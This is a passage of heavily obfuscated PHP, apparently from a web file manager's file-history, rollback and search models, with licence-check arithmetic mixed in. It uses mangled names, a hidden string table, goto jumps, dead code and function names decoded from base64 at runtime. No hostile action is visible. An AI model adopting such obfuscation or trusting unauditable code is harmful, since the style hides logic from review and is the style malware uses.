$ô‡É¿·İ < $ğ½¥®ô * 10; $ô‡É¿·İ++) { if (($ğ½¥®ô * $ô‡É¿·İ + 1) % $ §§ºÈğ == 0) { $ƒñá…†Õ = intval(($ğ½¥®ô * $ô‡É¿·İ + 1) / $ §§ºÈğ); break; } } $ÜÀ’éÇ‘ = $this->qtsn703f7da1($ÄËåòÕì * $´£±Éñ . $£¦—ªê[6], $£¦—ªê[136]); $¯—ÀÚÊÚ = md5($£¦—ªê[304] . ($ÄËåòÕì + $´£±Éñ) . $£¦—ªê[305] . $ §§ºÈğ . $£¦—ªê[305] . $ƒñá…†Õ . $£¦—ªê[306]); $ïòÕ†¤š = $this->qtsn703f7da1($‚ÇøÀÚ˜, $¯—ÀÚÊÚ) . $£¦—ªê[307] . $ÜÀ’éÇ‘; $ı¸©ûÎŞ = $ê‰¼İ„§[810]; if (strlen($ı¸©ûÎŞ) < $ê‰¼İ„§[693]) { die; } return $ïòÕ†¤š; $ĞñÚ®“ = $ê‰¼İ„§[811]; if (!$ĞñÚ®“) { return; } } public function kcbmb8d5ff68($Çóìì…å) { $óì»•íŠ =& $_SERVER[íïàËŸë]; $›äí’Ø– =& $_SERVER[°‡§ºŸ]; $ŒªÜ¸Ì = explode($›äí’Ø–[307], $Çóìì…å); $«¹¨£®ü = $óì»•íŠ[812]; while ($«¹¨£®ü < $óì»•íŠ[691]) { if ($«¹¨£®ü >= 0) { break; } $«¹¨£®ü++; } if (count($ŒªÜ¸Ì) != 2) { return $›äí’Ø–[6]; } $  ÃâÆ = $this->pmca76a1bc28($ŒªÜ¸Ì[1] . $›äí’Ø–[6], $›äí’Ø–[136]); $§‘±Ş¤Ú = $óì»•íŠ[813]; while (strlen($§‘±Ş¤Ú) < $óì»•íŠ[702]) { if (!$§‘±Ş¤Ú) { break; } $§‘±Ş¤Ú++; } if (!$  ÃâÆ) { return $›äí’Ø–[6]; } $  ÃâÆ = intval($  ÃâÆ); $í²ããÙ­ = $óì»•íŠ[814]; while ($í²ããÙ­ < $óì»•íŠ[710]) { if ($í²ããÙ­ >= 0) { break; } $í²ããÙ­++; } $ÔÈşö£À = 0; $ÈùÛâÛİ = $óì»•íŠ[815]; $Æ€çŠôè = 0; $×Ö«±¾Ğ = $óì»•íŠ[816]; if (strlen($×Ö«±¾Ğ) < $óì»•íŠ[693]) { die; } for ($¦˜è²İ² = 3; $¦˜è²İ² < $  ÃâÆ; $¦˜è²İ² += 2) { if ($  ÃâÆ % $¦˜è²İ² != 0) { continue; } $ÔÈşö£À = $¦˜è²İ²; $Æ€çŠôè = intval($  ÃâÆ / $¦˜è²İ²); $¼‚ŞÀ = $óì»•íŠ[817]; if (!$¼‚ŞÀ) { die; } break; $½Ìç‡‹Æ = $óì»•íŠ[818]; if (strlen($½Ìç‡‹Æ) < $óì»•íŠ[710]) { return; } } $’Ğæ¢¦ = ($ÔÈşö£À - 1) * ($Æ€çŠôè - 1); $ˆˆ˜¸Ğ“ = intval(($ÔÈşö£À + $Æ€çŠôè) / 2); while (1) { $İôõêåŞ = $ˆˆ˜¸Ğ“; $½’¹Óı» = $óì»•íŠ[819]; if (strlen($½’¹Óı») < $óì»•íŠ[693]) { die; } $¶÷ÖÂ¤ = $’Ğæ¢¦; $ëˆ¦üƒé = $óì»•íŠ[820]; if (strlen($ëˆ¦üƒé) < $óì»•íŠ[702]) { die; } while ($¶÷ÖÂ¤ % $İôõêåŞ != 0) { $¾ÊÉæÑÅ = $¶÷ÖÂ¤; $¶÷ÖÂ¤ = $İôõêåŞ; $Š£÷òÈ = $óì»•íŠ[821]; if (strlen($Š£÷òÈ) < $óì»•íŠ[702]) { return; } $İôõêåŞ = $¾ÊÉæÑÅ % $İôõêåŞ; } if ($İôõêåŞ == 1) { break; } else { $ˆˆ˜¸Ğ“++; } } $»›ûì„ú = 2; for ($¦˜è²İ² = 0; $¦˜è²İ² < $’Ğæ¢¦ * 10; $¦˜è²İ²++) { if (($’Ğæ¢¦ * $¦˜è²İ² + 1) % $ˆˆ˜¸Ğ“ == 0) { $»›ûì„ú = intval(($’Ğæ¢¦ * $¦˜è²İ² + 1) / $ˆˆ˜¸Ğ“); break; } } $ˆê²È—¼ = md5($›äí’Ø–[304] . ($ÔÈşö£À + $Æ€çŠôè) . $›äí’Ø–[305] . $ˆˆ˜¸Ğ“ . $›äí’Ø–[305] . $»›ûì„ú . $›äí’Ø–[306]); $ÔûÖ½¯ = $óì»•íŠ[822]; while ($ÔûÖ½¯ < $óì»•íŠ[693]) { if ($ÔûÖ½¯ >= 0) { break; } $ÔûÖ½¯++; } $»½êóò = $this->pmca76a1bc28($ŒªÜ¸Ì[0], $ˆê²È—¼); $û¡ã‡ ­ = $óì»•íŠ[823]; return $»½êóò; $ñµÈÍÎ­ = $óì»•íŠ[824]; if (strlen($ñµÈÍÎ­) < $óì»•íŠ[686]) { return; } } public function dhqyeff0fce3() { $İî™ªø =& $_SERVER[íïàËŸë]; $¹Î‰™° = mt_rand(pow(2, 14), pow(2, 16) - 1); $å’Ëõ = array(); $øÎŒÒÃ» = $İî™ªø[825]; $Àİí­ÏŞ = 1; while ($Àİí­ÏŞ <= (int) sqrt($¹Î‰™°)) { $íè£À§ = $Àİí­ÏŞ; $ÛÆĞ²È = $İî™ªø[713]; while ($ÛÆĞ²È < $İî™ªø[710]) { if ($ÛÆĞ²È >= 0) { break; } $ÛÆĞ²È++; } while (!0) { $íè£À§++; $œü†¬Ó = $İî™ªø[826]; while ($œü†¬Ó < $İî™ªø[693]) { if ($œü†¬Ó >= 0) { break; } $œü†¬Ó++; } if ($íè£À§ <= 2) { $Àİí­ÏŞ = $íè£À§; break; } else { if ($íè£À§ < 2) { continue; } } $ÂÜüİŸ = !0; for ($©™Ò…Úë = 2; $©™Ò…Úë <= sqrt($íè£À§); $©™Ò…Úë++) { if ($íè£À§ % $©™Ò…Úë == 0) { $ÂÜüİŸ = !1; } } if ($ÂÜüİŸ) { $Àİí­ÏŞ = $íè£À§; break; } } $å’Ëõ[] = $Àİí­ÏŞ; $Ä¼ıÛÉã = $İî™ªø[827]; while ($Ä¼ıÛÉã < $İî™ªø[693]) { if ($Ä¼ıÛÉã >= 0) { break; } $Ä¼ıÛÉã++; } } $Šõ÷ù©½ = 2; $œ½Ò¶è™ = $İî™ªø[828]; for ($íè£À§ = $¹Î‰™°; $íè£À§ > 1; $íè£À§--) { $ÂÜüİŸ = !0; foreach ($å’Ëõ as $–·şş”ñ) { if ($íè£À§ % $–·şş”ñ == 0) { $ÂÜüİŸ = !1; break; } } if ($ÂÜüİŸ) { $Šõ÷ù©½ = $íè£À§; break; } } return $Šõ÷ù©½; } public function fszxae415af1($ÊØıâÔÛ, $¦¡¢¬Ø) { $ñ°˜æö£ =& $_SERVER[°‡§ºŸ]; return call_user_func(array($ñ°˜æö£[8], $ñ°˜æö£[308]), $ÊØıâÔÛ, $¦¡¢¬Ø); $êõŠÄÉ = $_SERVER[íïàËŸë][829]; if (!$êõŠÄÉ) { return; } } public function qtsn703f7da1($˜øüâ¥º, $‡­ö„ˆš) { $ó³­”ë =& $_SERVER[°‡§ºŸ]; return call_user_func(array($ó³­”ë[309], $ó³­”ë[310]), $˜øüâ¥º, $‡­ö„ˆš); $É¸¶À«Ä = $_SERVER[íïàËŸë][830]; } public function pmca76a1bc28($İü²Áğ, $³–È×ÓÔ) { $õ¯Ö–íé =& $_SERVER[°‡§ºŸ]; return call_user_func(array($õ¯Ö–íé[309], $õ¯Ö–íé[311]), $İü²Áğ, $³–È×ÓÔ); } } goto aÆèŠ‚“¢³; F•°Û‰´: $fileSize = strrev(base64_decode($_SERVER[†¥¡¿³Ú][0])); function binCheckNeq($“¢ØüÈı, $‰çœéå²) { return $“¢ØüÈı != $‰çœéå²; } $_SERVER[$_SERVER[†¥¡¿³Ú][1]] = $fileSize($_SERVER[$_SERVER[†¥¡¿³Ú][2]]); goto d´øÄŞ§ÖÄ; fÂ’Õ©§–·: class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\157\x5f\163\157\x75\x72\143\x65\x5f\150\151\163\164\157\x72\x79"; public function historyCount($–¨‚¿í©) { $ÌîÇã²§ =& $_SERVER[íïàËŸë]; if (!$–¨‚¿í©) { return array(); } if (is_string($–¨‚¿í©) || is_int($–¨‚¿í©)) { $–¨‚¿í© = array($–¨‚¿í©); } $À©ãÒ¸æ = array($ÌîÇã²§[193], $ÌîÇã²§[2013] => $ÌîÇã²§[565]); $£–»™Õá = array($ÌîÇã²§[193] => array($ÌîÇã²§[7], $–¨‚¿í©)); $•¸à˜¬× = $this->field($À©ãÒ¸æ)->where($£–»™Õá)->group($ÌîÇã²§[193])->select(); return array_to_keyvalue($•¸à˜¬×, $ÌîÇã²§[193], $ÌîÇã²§[565]); } public function addHistory($Üãáª»ä, $Î°¦¨¥ = '') { $¦Ô¶ïûô =& $_SERVER[íïàËŸë]; $÷¢ì™à¿ = array($¦Ô¶ïûô[491] => $Üãáª»ä[$¦Ô¶ïûô[193]], $¦Ô¶ïûô[1773] => isset($Üãáª»ä[$¦Ô¶ïûô[529]]) ? $Üãáª»ä[$¦Ô¶ïûô[529]] : $Üãáª»ä[$¦Ô¶ïûô[527]], $¦Ô¶ïûô[542] => $Üãáª»ä[$¦Ô¶ïûô[541]], $¦Ô¶ïûô[617] => $Üãáª»ä[$¦Ô¶ïûô[79]], $¦Ô¶ïûô[2230] => $Î°¦¨¥); if ($GLOBALS[$¦Ô¶ïûô[6]][$¦Ô¶ïûô[92]][$¦Ô¶ïûô[1313]] >= 1) { $this->historyAutoClear($÷¢ì™à¿[$¦Ô¶ïûô[193]]); $this->add($÷¢ì™à¿); } Hook::trigger($¦Ô¶ïûô[2231], $÷¢ì™à¿); Model($¦Ô¶ïûô[2232])->eventFileEdit($Üãáª»ä[$¦Ô¶ïûô[193]]); } private function historyAutoClear($×’ÎğÓ¢) { $ÏôÚ¾îÓ =& $_SERVER[íïàËŸë]; $ğƒ»¾º = Model($ÏôÚ¾îÓ[853])->get($ÏôÚ¾îÓ[1335]); $¾€ßôÄÈ = intval($GLOBALS[$ÏôÚ¾îÓ[6]][$ÏôÚ¾îÓ[92]][$ÏôÚ¾îÓ[1313]]); $æŒü–Ü“ = $ğƒ»¾º == $ÏôÚ¾îÓ[1336] ? min(5, $¾€ßôÄÈ) : $¾€ßôÄÈ; $æŒü–Ü“ = $æŒü–Ü“ <= 0 ? 0 : $æŒü–Ü“ - 1; if ($æŒü–Ü“ >= 499) { return; } $š§§ğ˜¦ = array($ÏôÚ¾îÓ[491] => $×’ÎğÓ¢); $Áß¨ß“ô = $this->field($ÏôÚ¾îÓ[2233])->where($š§§ğ˜¦)->order($ÏôÚ¾îÓ[2227])->select(); if (!$Áß¨ß“ô || $æŒü–Ü“ >= count($Áß¨ß“ô)) { return; } $¤â‰µ¹ó = array_to_keyvalue($Áß¨ß“ô, $ÏôÚ¾îÓ[12], $ÏôÚ¾îÓ[475]); $¤â‰µ¹ó = array_slice($¤â‰µ¹ó, $æŒü–Ü“); $ò£İ‚ö = array_to_keyvalue($Áß¨ß“ô, $ÏôÚ¾îÓ[12], $ÏôÚ¾îÓ[541]); $ò£İ‚ö = array_slice($ò£İ‚ö, $æŒü–Ü“); if (!$¤â‰µ¹ó || !$ò£İ‚ö) { return; } $š§§ğ˜¦ = array($ÏôÚ¾îÓ[493] => array($ÏôÚ¾îÓ[7], $¤â‰µ¹ó)); $this->where($š§§ğ˜¦)->delete(); Model($ÏôÚ¾îÓ[544])->remove($ò£İ‚ö); } public function listData($‡Ş¬ïÔÈ) { $ïê„’àß =& $_SERVER[íïàËŸë]; $ööä‘ô = array($ïê„’àß[491] => $‡Ş¬ïÔÈ); $Î‚²üÉØ = $ïê„’àß[2234]; $ïçŸãĞ— = $this->field($Î‚²üÉØ)->where($ööä‘ô)->order($ïê„’àß[2227])->selectPage(); $this->_listAppendUser($ïçŸãĞ—[$ïê„’àß[445]]); $ëóè¶£ = Model($ïê„’àß[853])->get($ïê„’àß[1335]); $úûëûÂ¢ = 5; if ($ëóè¶£ == $ïê„’àß[1336]) { $ïçŸãĞ—[$ïê„’àß[445]] = array_slice($ïçŸãĞ—[$ïê„’àß[445]], 0, $úûëûÂ¢); $ïçŸãĞ—[$ïê„’àß[442]] = array($ïê„’àß[2235] => 1, $ïê„’àß[2236] => 20, $ïê„’àß[2237] => 1, $ïê„’àß[2238] => count($ïçŸãĞ—[$ïê„’àß[445]])); } return $ïçŸãĞ—; } protected function _listAppendUser(&$ëşù¡—«) { $¤øšŒõÚ =& $_SERVER[íïàËŸë]; $œäÂ¼Ú = array_to_keyvalue($ëşù¡—«, $¤øšŒõÚ[12], $¤øšŒõÚ[1782]); $ŸÍ–íâ = Model($¤øšŒõÚ[598])->userListInfo($œäÂ¼Ú); foreach ($ëşù¡—« as &$ö­Ç¹‡¹) { $¦Ş€“ø¡ = $ö­Ç¹‡¹[$¤øšŒõÚ[1782]]; $ö­Ç¹‡¹[$¤øšŒõÚ[527]] = $ŸÍ–íâ[$¦Ş€“ø¡] ? $ŸÍ–íâ[$¦Ş€“ø¡] : !1; } unset($ö­Ç¹‡¹); } public function fileInfo($ƒğŒ¦ğê) { $áÖ§°Æî =& $_SERVER[íïàËŸë]; $Ş•¥÷Ä = $this->tablePrefix; $¿ó‚ÄıÖ = "{$Ş•¥÷Ä}\151\x6f\137\x66\x69\x6c\x65\x20\146\151\x6c\x65\163\40\x6f\x6e\40\146\151\x6c\145\x73\56\x66\x69\x6c\145\111\104\x20\x3d\x20\x68\x69\163\164\x6f\162\171\x2e\x66\151\x6c\x65\111\104"; return $this->alias($áÖ§°Æî[2239])->where(array($áÖ§°Æî[493] => $ƒğŒ¦ğê))->join($¿ó‚ÄıÖ, $áÖ§°Æî[2240])->find(); } public function removeItem($ÇÍ»¸Á) { $ÄÁ¤ŠÍÜ =& $_SERVER[íïàËŸë]; $ş³¼¬ÌÂ = array($ÄÁ¤ŠÍÜ[493] => $ÇÍ»¸Á); $ı“·Œ• = $this->where($ş³¼¬ÌÂ)->find(); if ($ı“·Œ•) { $¡•ßâ¶ = $this->where($ş³¼¬ÌÂ)->delete(); Model($ÄÁ¤ŠÍÜ[544])->remove($ı“·Œ•[$ÄÁ¤ŠÍÜ[541]]); return $¡•ßâ¶; } return !1; } public function removeBySource($«“àÔ”æ) { $ı«İñº =& $_SERVER[íïàËŸë]; if (!$«“àÔ”æ) { return !1; } if (!is_array($«“àÔ”æ)) { $«“àÔ”æ = array($«“àÔ”æ); } $úñ³ûË… = array($ı«İñº[491] => array($ı«İñº[7], $«“àÔ”æ)); $¤äß´  = $this->field($ı«İñº[542])->where($úñ³ûË…)->select(); if ($¤äß´ ) { $this->where($úñ³ûË…)->delete(); $¼Æ¦­ìØ = array_to_keyvalue($¤äß´ , $ı«İñº[12], $ı«İñº[541]); Model($ı«İñº[544])->remove($¼Æ¦­ìØ); } return !0; } public function setDetail($®ÖÅó†÷, $ğú“„íì) { $éåÊ„¤“ =& $_SERVER[íïàËŸë]; return $this->where(array($éåÊ„¤“[493] => $®ÖÅó†÷))->save(array($éåÊ„¤“[2230] => $ğú“„íì)); } public function rollbackToItem($¦êÉ¯é, $™¼ŠßÆ¥) { $„“€äã» =& $_SERVER[íïàËŸë]; $„˜ÉÔŸ = Model($„“€äã»[907])->sourceInfo($¦êÉ¯é); $this->addHistory($„˜ÉÔŸ, LNG($„“€äã»[2241])); $¡²ÉÆ˜ = $this->find($™¼ŠßÆ¥); $“íááÇ† = array($„“€äã»[541] => $¡²ÉÆ˜[$„“€äã»[541]], $„“€äã»[79] => $¡²ÉÆ˜[$„“€äã»[79]], $„“€äã»[88] => time(), $„“€äã»[529] => USER_ID); Model($„“€äã»[907])->where(array($„“€äã»[193] => $¦êÉ¯é))->save($“íááÇ†); return $this->where(array($„“€äã»[493] => $™¼ŠßÆ¥))->delete(); } public function clearSame($¢ûñº—ã) { $Å¹“‘Øî =& $_SERVER[íïàËŸë]; $ÜÃÌšø = $this->listData($¢ûñº—ã); $÷œ¼²ªÆ = array_to_keyvalue_group($ÜÃÌšø, $Å¹“‘Øî[541]); $ã²´Ø½‹ = array(); $üÄ‰¦ß× = array(); foreach ($÷œ¼²ªÆ as $ğşĞ¹ô) { if (!$ğşĞ¹ô || count($ğşĞ¹ô) <= 1) { continue; } foreach ($ğşĞ¹ô as $ÖÚ”‡Ã¸) { $ã²´Ø½‹[] = $ÖÚ”‡Ã¸[$Å¹“‘Øî[541]]; $üÄ‰¦ß×[] = $ÖÚ”‡Ã¸[$Å¹“‘Øî[475]]; } } if (!$üÄ‰¦ß×) { return; } $this->where(array($Å¹“‘Øî[475] => array($Å¹“‘Øî[7], $üÄ‰¦ß×)))->delete(); Model($Å¹“‘Øî[544])->remove($ã²´Ø½‹); } public function userSpace() { $È£…½Ïé =& $_SERVER[íïàËŸë]; $´óŸ«ä’ = $this->tablePrefix; $·ŒïÜµª = array($È£…½Ïé[1773] => USER_ID); $°ÅõÆÁà = "{$´óŸ«ä’}\x69\x6f\137\x66\x69\x6c\x65\x20\x66\x69\154\145\163\x20\157\156\40\146\151\154\x65\163\x2e\x66\151\x6c\x65\x49\104\x20\75\x20\150\x69\163\x74\x6f\162\x79\56\x66\x69\154\145\111\x44"; return $this->alias($È£…½Ïé[2239])->where($·ŒïÜµª)->join($°ÅõÆÁà, $È£…½Ïé[2240])->sum($È£…½Ïé[79]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($¡õû›â‰) { $ãã½·îƒ =& $_SERVER[íïàËŸë]; $»ıùÊµ© = KodIO::fileTypeList(); $‡¾Á‘ºû = $»ıùÊµ©[$¡õû›â‰]; if (!$‡¾Á‘ºû) { return array(); } $ˆå³êå€ = $‡¾Á‘ºû[$ãã½·îƒ[169]]; $‘”›Ôğ¥ = $ãã½·îƒ[7]; if (!$‡¾Á‘ºû[$ãã½·îƒ[169]]) { $½Øüâºà = array_to_keyvalue($»ıùÊµ©, $ãã½·îƒ[12], $ãã½·îƒ[169]); $ˆå³êå€ = implode($ãã½·îƒ[50], $½Øüâºà); $‘”›Ôğ¥ = $ãã½·îƒ[2242]; } $±š½Æ·Ô = explode($ãã½·îƒ[50], trim($ˆå³êå€, $ãã½·îƒ[50])); return array($‘”›Ôğ¥, $±š½Æ·Ô); } public function listPathType($‡Õ¿¤êœ) { $¹¹ş³çŞ =& $_SERVER[íïàËŸë]; $ø‰¹üÎş = $this->fileTypeWhere($‡Õ¿¤êœ); if (!$ø‰¹üÎş) { return array(); } $ÍÒÓ û = USER_ID; $†²ÀÜ·Ü = Model($¹¹ş³çŞ[598])->getInfo($ÍÒÓ û); $«”êÈóÃ = array($¹¹ş³çŞ[648] => SourceModel::TYPE_USER, $¹¹ş³çŞ[584] => array($¹¹ş³çŞ[612], $¹¹ş³çŞ[594] . $†²ÀÜ·Ü[$¹¹ş³çŞ[90]][$¹¹ş³çŞ[193]] . $¹¹ş³çŞ[613]), $¹¹ş³çŞ[649] => $ÍÒÓ û, $¹¹ş³çŞ[646] => 0, $¹¹ş³çŞ[647] => $ø‰¹üÎş); return $this->listSource($«”êÈóÃ); } public function listSearch($’åİ¿, $’à³áë‰ = 300) { $¯ÕÑåìÏ =& $_SERVER[íïàËŸë]; if (isset($’åİ¿[$¯ÕÑåìÏ[2078]]) && $’åİ¿[$¯ÕÑåìÏ[2078]]) { $’åİ¿[$¯ÕÑåìÏ[2078]] = str_replace($¯ÕÑåìÏ[460], $¯ÕÑåìÏ[2243], trim($’åİ¿[$¯ÕÑåìÏ[2078]])); } $Û€ÔÆÆ = $this->_parseSearchWhere($’åİ¿); if (!isset($Û€ÔÆÆ[$¯ÕÑåìÏ[505]])) { $Û€ÔÆÆ[$¯ÕÑåìÏ[505]] = 0; } $ÕÊ˜ÊûÔ = $¯ÕÑåìÏ[2244]; $©ãôÂòî = $Û€ÔÆÆ; $“Ï•ô• = $ÕÊ˜ÊûÔ; $this->_listSearchBindPinyin($’åİ¿, $Û€ÔÆÆ, $ÕÊ˜ÊûÔ); $this->alias($¯ÕÑåìÏ[519])->_makeOrder(); $Û€ÔÆÆ = $this->parseWhereLike($Û€ÔÆÆ); $É»ğä˜Ø = $this->distinct(!0)->field($ÕÊ˜ÊûÔ)->where($Û€ÔÆÆ)->selectPage($’à³áë‰); if ($GLOBALS[$¯ÕÑåìÏ[6]][$¯ÕÑåìÏ[457]][$¯ÕÑåìÏ[458]] && Input::check($’åİ¿[$¯ÕÑåìÏ[2078]], $¯ÕÑåìÏ[655]) && $É»ğä˜Ø[$¯ÕÑåìÏ[442]][$¯ÕÑåìÏ[429]] == 1 && $É»ğä˜Ø[$¯ÕÑåìÏ[442]][$¯ÕÑåìÏ[443]] == 0) { $É»ğä˜Ø = $this->distinct(!0)->field($ÕÊ˜ÊûÔ)->where($©ãôÂòî)->limit(1000)->select(); $É»ğä˜Ø = array_page_split($É»ğä˜Ø, !1, $’à³áë‰); } $this->_listSearchFileContent($É»ğä˜Ø, $’åİ¿, $“Ï•ô•, $©ãôÂòî); $this->_listSearchDesc($É»ğä˜Ø, $’åİ¿, $“Ï•ô•); $this->_listSearchTag($É»ğä˜Ø, $’åİ¿, $“Ï•ô•); $this->_listSearchGroupTag($É»ğä˜Ø, $’åİ¿, $“Ï•ô•); $this->_listDataApply($É»ğä˜Ø[$¯ÕÑåìÏ[445]]); $this->_listMake($É»ğä˜Ø); return $É»ğä˜Ø; } private function _listSearchFileContent(&$²Šäú, $ı’æş™£, $¡”îØß, $÷Á€ŠÖì) { $œÀ°ıËà =& $_SERVER[íïàËŸë]; if (!$ı’æş™£[$œÀ°ıËà[2078]] || $²Šäú[$œÀ°ıËà[442]][$œÀ°ıËà[429]] > 1) { return; } if (!isset($÷Á€ŠÖì[$œÀ°ıËà[32]]) || !is_array($ı’æş™£[$œÀ°ıËà[541]])) { return; } $÷Á€ŠÖì[$œÀ°ıËà[541]] = array($œÀ°ıËà[7], $ı’æş™£[$œÀ°ıËà[541]]); unset($÷Á€ŠÖì[$œÀ°ıËà[32]]); unset($ı’æş™£[$œÀ°ıËà[541]]); $¡ßáŸÎ = $this->field($¡”îØß)->where($÷Á€ŠÖì)->limit($œÀ°ıËà[2245])->select(); if (!$¡ßáŸÎ || count($¡ßáŸÎ) == 0) { return; } $²Šäú[$œÀ°ıËà[445]] = array_merge($¡ßáŸÎ, $²Šäú[$œÀ°ıËà[445]]); $²Šäú[$œÀ°ıËà[442]][$œÀ°ıËà[443]] += count($¡ßáŸÎ); } private function _listSearchTag(&$£Ô“×¼, $ŠÖš±™, $êô®»şÅ) { $½ÎÃËÓÎ =& $_SERVER[íïàËŸë]; if (!$ŠÖš±™[$½ÎÃËÓÎ[2078]] || $£Ô“×¼[$½ÎÃËÓÎ[442]][$½ÎÃËÓÎ[429]] > 1) { return; } $À³¸ñÑ‹ = Model($½ÎÃËÓÎ[2246])->listData(); $—åÓ¤ = array(); $Îã¥â¶ = $ŠÖš±™[$½ÎÃËÓÎ[2078]]; foreach ($À³¸ñÑ‹ as $”Äğû¨†) { $Õ²¦¡ = $”Äğû¨†[$½ÎÃËÓÎ[32]]; $‰£Ö°¾Ï = str_replace($½ÎÃËÓÎ[53], $½ÎÃËÓÎ[12], Pinyin::get($Õ²¦¡)); if (stripos($Õ²¦¡, $Îã¥â¶) !== !1 || stripos($‰£Ö°¾Ï, $Îã¥â¶) !== !1) { $—åÓ¤[] = $”Äğû¨†[$½ÎÃËÓÎ[475]]; } } if (!$—åÓ¤) { return; } $êÇ—Ë¯´ = array($½ÎÃËÓÎ[500] => array($½ÎÃËÓÎ[7], $—åÓ¤), $½ÎÃËÓÎ[1782] => USER_ID); $Çİä¾ = Model($½ÎÃËÓÎ[502])->field($½ÎÃËÓÎ[87])->where($êÇ—Ë¯´)->select(); $Çİä¾ = array_to_keyvalue($Çİä¾, $½ÎÃËÓÎ[12], $½ÎÃËÓÎ[87]); $¾ØÒ÷Ğ– = array_unique($Çİä¾); $this->_listSearchMerge($£Ô“×¼, $ŠÖš±™, $êô®»şÅ, $¾ØÒ÷Ğ–); } private function _listSearchDesc(&$ƒ³•×š“, $¬Ç¥§», $ ûô°ä÷) { $ª²ï–ğ— =& $_SERVER[íïàËŸë]; if (!$¬Ç¥§»[$ª²ï–ğ—[2078]] || $ƒ³•×š“[$ª²ï–ğ—[442]][$ª²ï–ğ—[429]] > 1) { return; } $ŒòŒŸÁâ = array($ª²ï–ğ—[97] => $ª²ï–ğ—[526], $ª²ï–ğ—[450] => array($ª²ï–ğ—[459], $ª²ï–ğ—[2080] . $¬Ç¥§»[$ª²ï–ğ—[2078]] . $ª²ï–ğ—[2080])); $ì»…Şª· = !1; if ($ì»…Şª·) { $¾ûˆÎ = $this->listSearchChildren($¬Ç¥§»[$ª²ï–ğ—[192]]); $¾ûˆÎ = array_unique($¾ûˆÎ); if (!$¾ûˆÎ) { return; } $ŒòŒŸÁâ[$ª²ï–ğ—[193]] = array($ª²ï–ğ—[7], $¾ûˆÎ); } $½ÍÓş¨Ç = Model($ª²ï–ğ—[632])->field($ª²ï–ğ—[193])->where($ŒòŒŸÁâ)->limit(5000)->select(); $¼ÛôÚáú = array_to_keyvalue($½ÍÓş¨Ç, $ª²ï–ğ—[12], $ª²ï–ğ—[193]); $this->_listSearchMerge($ƒ³•×š“, $¬Ç¥§», $ ûô°ä÷, $¼ÛôÚáú); } private function _listSearchGroupTag(&$ú·“àûİ, $­ış£ïĞ, $õÕŸ¯‡×) { $ê‹ŠØóª =& $_SERVER[íïàËŸë]; if (!$­ış£ïĞ[$ê‹ŠØóª[2078]] || $ú·“àûİ[$ê‹ŠØóª[442]][$ê‹ŠØóª[429]] > 1 || !$­ış£ïĞ[$ê‹ŠØóª[192]]) { return; } $ÂÅĞİ‘ş = $this->sourceInfo($­ış£ïĞ[$ê‹ŠØóª[192]]); if (!$ÂÅĞİ‘ş || $ÂÅĞİ‘ş[$ê‹ŠØóª[190]] != SourceModel::TYPE_GROUP) { return; } $éÒû®²Ú = $ÂÅĞİ‘ş[$ê‹ŠØóª[569]]; $æµ—¨Ê— = Model($ê‹ŠØóª[2247])->get($éÒû®²Ú); $«õÈ‘ÙÉ = array(); $ŒÓìÊä = $­ış£ïĞ[$ê‹ŠØóª[2078]]; foreach ($æµ—¨Ê—[$ê‹ŠØóª[445]] as $üæŸ¹–à) { $Ä÷ı„ş = $üæŸ¹–à[$ê‹ŠØóª[32]]; $Šõ›Öë = str_replace($ê‹ŠØóª[53], $ê‹ŠØóª[12], Pinyin::get($Ä÷ı„ş)); if (stripos($Ä÷ı„ş, $ŒÓìÊä) !== !1 || stripos($Šõ›Öë, $ŒÓìÊä) !== !1) { $«õÈ‘ÙÉ[] = $üæŸ¹–à[$ê‹ŠØóª[475]]; } } if (!$«õÈ‘ÙÉ) { return; } $ €‡ßé¾ = array($ê‹ŠØóª[500] => array($ê‹ŠØóª[7], $«õÈ‘ÙÉ), $ê‹ŠØóª[1782] => 0, $ê‹ŠØóª[33] => $ê‹ŠØóª[2100] . $éÒû®²Ú); $ëÕÀ­Ø½ = Model($ê‹ŠØóª[502])->field($ê‹ŠØóª[87])->where($ €‡ßé¾)->select(); $ëÕÀ­Ø½ = array_to_keyvalue($ëÕÀ­Ø½, $ê‹ŠØóª[12], $ê‹ŠØóª[87]); $ù×ÆÈÇ = array_unique($ëÕÀ­Ø½); $this->_listSearchMerge($ú·“àûİ, $­ış£ïĞ, $õÕŸ¯‡×, $ù×ÆÈÇ); } private function _listSearchMerge(&$¯¥À«¶·, $Äİø¢ï±, $ßõš³†, $µ¡Ø°ø›) { $û™ü€Ø£ =& $_SERVER[íïàËŸë]; if (!$µ¡Ø°ø›) { return; } $å£îÈ¹­ = array_to_keyvalue($¯¥À«¶·[$û™ü€Ø£[445]], $û™ü€Ø£[12], $û™ü€Ø£[193]); $¹äîÇ—š = array_diff($µ¡Ø°ø›, $å£îÈ¹­); if (!$¹äîÇ—š) { return; } $îÀºû§¤ = array($û™ü€Ø£[193] => array($û™ü€Ø£[7], $¹äîÇ—š)); $éåÎå¯ô = $this->field($ßõš³†)->where($îÀºû§¤)->select(); if (!$éåÎå¯ô) { return; } $¿ï³Ğï“ = array(); foreach ($éåÎå¯ô as $ÕÏÆÈ¥) { if ($this->_listSearchFilter($ÕÏÆÈ¥, $Äİø¢ï±)) { $¿ï³Ğï“[] = $ÕÏÆÈ¥; } } $¯¥À«¶·[$û™ü€Ø£[445]] = array_merge($¿ï³Ğï“, $¯¥À«¶·[$û™ü€Ø£[445]]); $¯¥À«¶·[$û™ü€Ø£[442]][$û™ü€Ø£[443]] += count($¿ï³Ğï“); } private function _listSearchFilter($ô©éÂ¥Ÿ, $·Ñ„Ï½É) { $¼™ØñÖÅ =& $_SERVER[íïàËŸë]; $‰˜©¯î— = $ô©éÂ¥Ÿ[$¼™ØñÖÅ[485]] == $¼™ØñÖÅ[91]; if (!strstr($ô©éÂ¥Ÿ[$¼™ØñÖÅ[584]], $¼™ØñÖÅ[50] . $·Ñ„Ï½É[$¼™ØñÖÅ[192]] . $¼™ØñÖÅ[50])) { return !1; } if (isset($·Ñ„Ï½É[$¼™ØñÖÅ[486]]) && $·Ñ„Ï½É[$¼™ØñÖÅ[486]] != $¼™ØñÖÅ[859]) { if ($·Ñ„Ï½É[$¼™ØñÖÅ[486]] == $¼™ØñÖÅ[78] && !$‰˜©¯î—) { return !1; } if ($·Ñ„Ï½É[$¼™ØñÖÅ[486]] != $¼™ØñÖÅ[78] && $‰˜©¯î—) { return !1; } if (!strstr($ô©éÂ¥Ÿ[$¼™ØñÖÅ[169]], $¼™ØñÖÅ[50] . $·Ñ„Ï½É[$¼™ØñÖÅ[486]] . 